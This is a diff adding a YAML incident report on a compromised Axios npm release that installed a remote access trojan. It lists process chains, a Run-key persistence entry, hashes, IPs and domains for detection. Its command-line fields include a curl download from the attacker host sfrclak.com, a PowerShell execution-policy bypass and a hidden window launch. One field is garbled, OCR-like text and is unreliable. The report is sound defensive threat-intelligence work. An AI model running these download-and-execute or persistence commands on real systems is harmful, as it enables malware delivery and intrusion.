@@ -1,0 +1,80 @@
+title: Axios NPM Package Compromise Incident Report
+description: Adversary compromised npm account to publish malicious Axios versions
+  with a trojanized dependency, deploying a cross-platform RAT.
+malware_families:
+- Remote Access Trojan (RAT)
+TTPs:
+  processes:
+  - node.exe
+  - wt.exe
+  - powershell.exe
+  - cmd.exe
+  - cscript.exe
+  - wscript.exe
+  - curl.exe
+  commandline:
+  - where PowerShell
+  - wt.exe -w hidden
+  - cscript.exe //nologo 6202033.vbs
+  - powershell.exe -ep bypass -file 6202033.ps1
+  - cmd.exe /c curl http://sfrclak.com:8000/6202033 > i5202033
+  - node setup.js
+  powershell:
+  - //nologo & del I Y 202035, bs /7 gv 9 (576 csaiptexe cocript A 6202035 vbs //n0log0
+    Sv @ (71008 cmdiexe /coun -5 X POST -d packagesnpmorg/product "hitpi/sfrolak.com:8000/6202035" > i 5202053, 51 8 CAP... vv @ (6512 whexe w bidden -ep bypass -fle YU 6202133
+    051" htip://sficlak com B000/6202033"
+  scripting_engine:
+  - 6202033.vbs
+  registry_keys:
+  - HKEY_CURRENT_USER\USER_SID\Software\Microsoft\Windows\CurrentVersion\Run
+  image_load: []
+  network_connections:
+  - node.exe -> sfrclak.com:8000/6202033
+  - wt.exe -> sfrclak.com:8000/6202033
+  - curl.exe -> sfrclak.com:8000/6202033
+  file_activity:
+  - C:\ProgramData\wt.exe
+  - 6202033.vbs
+  - 6202033.ps1
+  - system.bat
+  - plain-crypto-js@4.2.1
+  - setup.js
+  - com.apple.act.mond
+  - ld.py
+  - axios-0.30.4.tgz
+  - axios-1.14.1.tgz
+  persistence:
+  - Registry key: HKEY_CURRENT_USER\USER_SID\Software\Microsoft\Windows\CurrentVersion\Run
+    Value name: MicrosoftUpdate
+    Value data: C:\ProgramData\system.bat
+  process_relations:
+  - node.exe -> wt.exe
+  - cmd.exe -> cscript.exe
+  - cmd.exe -> powershell.exe
+IOCs:
+  hashes:
+  - 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a
+  - 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101
+  - ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c
+  - fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf
+  - e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
+  - f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd
+  - e49c2732fb9861548208a78e72996b9c3c470b6b562576924bcc3a9fb75bf9ff
+  - 58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668
+  - 59336a964f110c25c112bcc5adca7090296b54ab33fa95c0744b94f8a0d80c0f
+  - 5bb67e88846096f1f8d42a0f0350c9c46260591567612ff9af46f98d1b7571cd
+  ip_addresses:
+  - 142.11.206.73
+  - 23.254.167.216
+  domains:
+  - sfrclak.com
+  - callnrwise.com
+  - calltan.com
+  urls:
+  - hxxp://sfrclak.com:8000/6202033
+authors:
+- Thomas Papaloukas
+- Panagiotis Panagopoulos
+reference: https://blog.nviso.eu/2026/04/03/the-axios-npm-supply-chain-incident-fake-dependency-real-backdoor
+date_of_publication: April 03, 2026
+file_creation_date: April 05, 2026
